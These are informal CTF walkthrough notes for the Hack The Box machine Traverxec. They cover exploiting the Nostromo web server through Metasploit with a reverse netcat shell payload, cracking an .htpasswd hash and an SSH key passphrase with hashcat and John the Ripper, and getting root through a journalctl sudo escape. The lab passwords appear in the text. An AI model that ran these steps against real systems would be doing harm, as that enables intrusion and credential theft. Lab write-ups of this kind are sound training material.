1. 
searchsploit nostromo
get the first one and import it into msfconsole

set payload cmd/unix/reverse_netcat

exploit

2.
after we gain access to the www-data shell
we change dir to /var/nostromo/conf

then
```
$ ls -a
$ cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```


3.


- "david" is the file which contains only the hash from the previous finding
- we will run -m 500 because the hash analyzer(web tool) found that the hash
is type of "md5-crypt"

https://hashcat.net/wiki/doku.php?id=example_hashes


hash analyzer: https://www.tunnelsup.com/hash-analyzer/

```
$ hashcat --force -m 500 david /usr/share/wordlists/rockyou.txt
```

Credentials found:

$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me   

The creds are a rabit hole

Read the conf file
serveradmin david....

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www


while in shell:
cd /home/david/public_www/

find a ziped file, unzip it to another accessible for writing dir, for instance /tmp/nothing
$ tar zxvf backup-ssh-identity-files.tgz -C /tmp/nothing


we found .ssh of david


store a backup to my machine.

It is inevitable that we prevent other users from having access to these files:
$ chmod 400 ~/id_rsa
or 
$ chmod 600 ~/id_rsa


try:
$ ssh -i id_rsa david@10.10.10.165
we will be promted for a passphrase

5.
#### Cracking the passphrase with ssh2john

$ cd ~/JohnTheRipper/run
$ python3 ssh2john.py ~/Documents/traverxec/id_rsa > ~/Documents/traverxec/tocrack

while in traverxec directory.
Cracking the passphrase:
$ john --wordlist=/usr/share/wordlists/rockyou.txt tocrack

this bruteforcing will find passphrase "hunter"

$ ssh -i id_rsa david@10.10.10.165      again

### For root:

while in david user

got to the bin/server-stats.sh as it is a suspicious file
then if you open it you will find a suspicious command. This
command.

Hint: use GTFObins

search for journalctl

we want the Sudo function (escalate access)

if we copy the server-stats.sh file as mycopy.sh
and change permissions to chmodo 777 if needed
then as we see from gtfobins we only need the "sudo journalctl"
. We erase the cat command
we execute the script:
./mycopy.sh

while viewing the document type:
!/bin/sh

just entered visual mode

we got access to root
